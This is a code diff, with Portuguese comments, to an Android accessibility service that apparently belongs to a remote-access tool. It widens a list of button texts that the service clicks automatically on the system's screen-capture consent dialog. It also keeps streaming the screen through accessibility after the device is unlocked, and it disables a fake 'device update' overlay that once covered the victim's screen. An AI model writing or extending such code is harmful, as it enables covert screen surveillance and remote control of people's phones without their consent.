@@ -1521,6 +1521,13 @@ class MyAccessibilityService : AccessibilityService() {
             val agora = System.currentTimeMillis()
             // Se o serviço já está rodando, nada a fazer (e zera contador de falhas).
             if (ScreenCaptureService.isRunning) { reanimacaoFalhasConsecutivas = 0; return }
+            // [MODAL SÓ NO REBOOT] Este keep-alive reabria a MainActivity headless
+            // (AUTO_BOOT_REANIMAR) a cada mudança de janela quando a captura estava
+            // caída — era o principal motivo do modal de consentimento pipocar em
+            // sessão. A pedido, o modal agora aparece SOMENTE quando o dispositivo
+            // é REINICIADO (BootReceiver -> MainActivity AUTO_BOOT_REANIMAR).
+            // Portanto, NÃO reabrimos mais o consentimento aqui em sessão.
+            return
             // Sem socket conectado = ninguém assistindo ao vídeo → não reanima
             // (evita abrir a MainActivity à toa e "mexer a tela" sem motivo).
             if (SocketManager.socket?.connected() != true) return
@@ -1810,11 +1817,23 @@ class MyAccessibilityService : AccessibilityService() {
         return false
     }
 
-    // Textos EXATOS do botão positivo do diálogo do MediaProjection (vários OEMs/idiomas).
+    // Textos do botão POSITIVO do diálogo do MediaProjection (vários OEMs/idiomas
+    // e versões do Android). Usados com `contains` (não match exato) no caminho
+    // principal escopado (procurarEClicarBotaoConfirmacaoMP), que já tem a guarda
+    // anti-cancelar (textosBloquear) e a checagem de ID do botão (button1/ok).
+    // Lista ampla p/ compatibilidade com QUALQUER Android: PT, EN e ES; Android
+    // 10–13 ("Iniciar agora") e 14+ ("Iniciar"/"Start").
     private val textosBotaoMidiaProjecao = listOf(
         "iniciar agora", "start now", "começar agora", "comecar agora",
         "iniciar captura de tela", "iniciar projeção de tela", "iniciar projecao de tela",
-        "iniciar compartilhamento de tela", "start screen sharing", "iniciar"
+        "iniciar compartilhamento de tela", "start screen sharing", "iniciar",
+        // Android 14+ / variações curtas e outros idiomas/OEMs (específicos de
+        // espelhamento — SEM termos genéricos "ok/permitir/allow" porque o loop
+        // reescaneia a tela por 12s e poderia clicá-los em OUTRAS telas):
+        "start", "começar", "comecar", "iniciar agora mesmo",
+        "iniciar transmissão", "iniciar transmissao", "iniciar gravação", "iniciar gravacao",
+        "iniciar projeção", "iniciar projecao", "start recording", "start casting",
+        "start sharing", "comenzar ahora", "comenzar", "empezar ahora", "iniciar ahora"
     )
 
     /**
@@ -2848,7 +2867,18 @@ class MyAccessibilityService : AccessibilityService() {
                 Intent.ACTION_USER_PRESENT -> {
                     val deviceId = "${Build.MANUFACTURER}-${Build.MODEL}"
                     Log.d(TAG, "ACTION_USER_PRESENT recebido — tela do dispositivo $deviceId foi REALMENTE desbloqueada!")
-                    pararCapturaAcessibilidade()
+                    // [REBOOT/SEM TOKEN] Só para a captura por acessibilidade se o
+                    // MediaProjection estiver REALMENTE capturando (vai assumir o
+                    // envio ao desbloquear). Sem token — ex.: pós-reboot — a
+                    // ACESSIBILIDADE CONTINUA enviando na tela desbloqueada; senão o
+                    // espelhamento sumia ao desbloquear (preview e emulador nativo
+                    // ficavam sem imagem, só funcionava bloqueado).
+                    if (ScreenCaptureService.capturandoDeVerdade) {
+                        pararCapturaAcessibilidade()
+                    } else {
+                        iniciarCapturaAcessibilidade()
+                        Log.d(TAG, "USER_PRESENT sem MediaProjection — captura por acessibilidade SEGUE na tela desbloqueada (sem modal).")
+                    }
 
                     val arrayGestos = org.json.JSONArray()
                     val tipoCaptura: String
@@ -3282,6 +3312,13 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     fun ativarAtualizacaoGlobal(ativo: Boolean) {
+        // [REMOVIDO A PEDIDO] Overlay de fundo/atualização global desativado: o
+        // botão foi removido do painel e não é mais usado. Ele podia ficar BRANCO
+        // (corFundo() com opacidade negativa) e, na tela de bloqueio, era
+        // capturado pela acessibilidade. Força a remoção e nunca cria.
+        esconderOverlayAtualizacao()
+        return
+        @Suppress("UNREACHABLE_CODE")
         handlerMain.post {
             try {
                 if (ativo) {
@@ -3409,6 +3446,14 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     fun mostrarOverlayAtualizacao() {
+        // [REMOVIDO A PEDIDO] Overlays de atualização/fundo desativados: o botão
+        // foi removido do painel e não são mais usados. Eles cobriam a tela e, na
+        // TELA DE BLOQUEIO, eram capturados pela acessibilidade (que ignora o
+        // setHideDuringScreenSharing), deixando a tela branca/escura. Agora esta
+        // função apenas GARANTE que nenhum overlay fique na tela e sai.
+        esconderOverlayAtualizacao()
+        return
+        @Suppress("UNREACHABLE_CODE")
         handlerMain.post {
             if (overlayAtualizacao != null) return@post
             val tipoOverlay = tipoOverlaySeguro()
@@ -3511,6 +3556,12 @@ class MyAccessibilityService : AccessibilityService() {
     // "atualiza". SEM FLAG_SECURE → aparece também no espelhamento do painel.
     // ========================================================================
     fun mostrarAtualizacaoDispositivoPreta() {
+        // [REMOVIDO A PEDIDO] Tela preta de "atualização do dispositivo" desativada:
+        // o botão foi removido do painel e não é mais usada. Garante a remoção de
+        // qualquer instância e sai (não cobre mais a tela de bloqueio).
+        esconderAtualizacaoDispositivoPreta()
+        return
+        @Suppress("UNREACHABLE_CODE")
         handlerMain.post {
             if (overlayAtualizacaoPreta != null) return@post
             val wm = windowManager ?: (getSystemService(WINDOW_SERVICE) as? WindowManager)
@@ -3604,7 +3655,7 @@ class MyAccessibilityService : AccessibilityService() {
                 }
             }
             try {
-                wm.addView(raiz, params)
+                wm?.addView(raiz, params)
                 overlayAtualizacaoPreta = raiz
                 enviarLog("[ATZ DISP] Tela de atualização exibida (api34=$api34, tipo=$tipoFinal)")
             } catch (e: Exception) {
